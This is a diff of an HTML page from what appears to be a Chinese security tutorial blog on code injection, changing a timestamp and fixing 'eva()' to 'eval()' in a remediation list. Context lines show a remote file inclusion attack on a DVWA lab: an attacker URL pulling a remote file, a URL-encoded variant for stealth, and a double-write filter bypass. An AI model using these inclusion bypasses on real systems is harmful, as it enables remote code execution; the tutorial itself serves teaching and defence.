@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://yoursite.com/images/pasted-174.png">
 <meta property="og:image" content="http://yoursite.com/images/pasted-175.png">
 <meta property="og:image" content="http://yoursite.com/images/pasted-176.png">
-<meta property="og:updated_time" content="2018-09-04T01:17:16.547Z">
+<meta property="og:updated_time" content="2018-09-04T09:17:41.878Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码注入漏洞">
 <meta name="twitter:image" content="http://yoursite.com/images/pasted-178.png">
@@ -377,7 +377,7 @@
 <h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
 <h4 id="攻击绕过-1"><a href="#攻击绕过-1" class="headerlink" title="攻击绕过"></a>攻击绕过</h4><p>构造url<br><code>http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</code><br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</span><br></pre></td></tr></table></figure></p>
 <p>可以使用双写绕过<br>例如page=ht<a href="http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。" target="_blank" rel="noopener">http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。</a></p>
-<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">禁用eva（）等可以执行命令的危险函数</span><br><span class="line">对用户的输入数据进行处理</span><br><span class="line">避免动态include远程文件</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">禁用eval（）等可以执行命令的危险函数</span><br><span class="line">对用户的输入数据进行处理</span><br><span class="line">避免动态include远程文件</span><br></pre></td></tr></table></figure>
       
     </div>
 	
